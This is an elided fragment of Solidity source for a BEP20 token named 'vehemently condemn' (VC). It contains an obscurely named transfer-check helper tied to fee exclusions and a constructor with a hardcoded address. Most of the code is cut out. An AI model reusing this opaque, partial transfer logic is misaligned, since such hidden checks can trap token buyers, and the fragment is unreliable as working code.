...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function _asicTrnsfer(address seds, address recpien) internal view returns (bool){
        return (seds != recpien) || (isExcludedFromFees[seds] == false || false);
    }
...
contract vehementlycondemn is BEP20 {
    constructor() BEP20(
        "vehemently condemn", 
        "VC",
        100000000,
        ...
        [uint256(1),uint256(2),uint256(0)],
        [uint256(1),uint256(2),uint256(0)],
        [0x4c3a88957c7C6b10a4A38182AB6dB263d98DF032,0x4c3a88957c7C6b10a4A38182AB6dB263d98DF032]
    ){}
}